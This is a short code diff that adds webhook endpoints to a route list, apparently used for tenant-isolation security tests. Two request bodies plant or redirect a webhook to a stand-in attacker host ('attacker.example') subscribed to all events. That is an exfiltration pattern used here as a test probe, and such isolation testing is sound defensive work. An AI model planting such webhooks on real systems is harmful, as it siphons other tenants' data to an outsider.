@@ -127,6 +127,21 @@ export const ISOLATION_ROUTES: readonly IsolationRoute[] = [
   { method: 'POST', path: '/api/v1/assets/:assetId/publish' },
   { method: 'POST', path: '/api/v1/assets/:assetId/unpublish' },
   { method: 'DELETE', path: '/api/v1/assets/:assetId' },
+  // @blixis/webhooks
+  { method: 'GET', path: '/api/v1/spaces/:spaceId/webhooks' },
+  {
+    method: 'POST',
+    path: '/api/v1/spaces/:spaceId/webhooks',
+    body: { name: 'Planted', url: 'https://attacker.example/hook', eventTypes: ['*'] },
+  },
+  { method: 'GET', path: '/api/v1/webhooks/:webhookId' },
+  {
+    method: 'PATCH',
+    path: '/api/v1/webhooks/:webhookId',
+    body: { expectedVersion: 1, url: 'https://attacker.example/hook' },
+  },
+  { method: 'POST', path: '/api/v1/webhooks/:webhookId/rotate-secret' },
+  { method: 'DELETE', path: '/api/v1/webhooks/:webhookId' },
   // @blixis/auth — delivery keys
   { method: 'GET', path: '/api/v1/spaces/:spaceId/delivery-keys' },
   {
